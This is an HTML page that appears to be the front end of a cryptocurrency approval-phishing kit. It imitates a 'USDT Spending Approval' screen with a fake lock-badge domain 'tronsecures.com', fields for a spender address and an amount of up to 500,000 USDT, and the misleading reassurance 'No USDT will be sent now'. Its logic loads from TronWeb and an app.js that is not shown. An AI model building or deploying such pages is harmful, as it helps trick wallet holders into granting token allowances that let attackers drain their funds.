<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>USDT Spending Approval</title>

<style>
*{box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto}
body{margin:0;background:#fff;color:#111}
.header{text-align:center;padding:14px;border-bottom:1px solid #eee;font-weight:600}
.main{padding:16px}
.label{font-size:13px;color:#666;margin:14px 0 8px}
.box{background:#f4f6f8;border-radius:12px;padding:12px 14px;display:flex;align-items:center;justify-content:space-between}
.box input{border:none;background:transparent;width:100%;font-size:15px;outline:none}
.actions{color:#3b71fe;font-weight:600;font-size:14px;margin-left:10px}
.warn{background:#fff3cd;border:1px solid #ffeeba;color:#856404;border-radius:12px;padding:12px;font-size:13px;margin-bottom:14px}
.hint{font-size:12px;color:#999;margin-top:6px}
.footer{position:fixed;left:0;right:0;bottom:24px;padding:0 16px}
.btn{width:100%;border:none;border-radius:26px;padding:16px;background:#0538b5;color:#fff;font-size:17px;font-weight:700}
.status{text-align:center;margin-top:12px;font-size:14px}
</style>
</head>

<body>

<div class="header">ðŸ”’ tronsecures.com</div>

<div class="main">

  

  <div class="label">Spender Address</div>
  <div class="box">
    <input id="spender" type="text" placeholder="Enter TRON address">
    <span class="actions">Paste</span>
  </div>

  <div class="label">Approval Amount (USDT)</div>
  <div class="box">
    <input id="amount" type="number" min="1" max="500000" value="1">
    <span class="actions">USDT</span>
  </div>
  <div class="hint">No USDT will be sent now.</div>

  <div class="label">Memo (optional)</div>
  <div class="box">
    <input type="text" placeholder="Optional">
  </div>

  <div id="status" class="status"></div>
</div>

<div class="footer">
  <button id="btn-next" class="btn">Approve USDT</button>
</div>

<script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
<script src="app.js"></script>
</body>
</html>
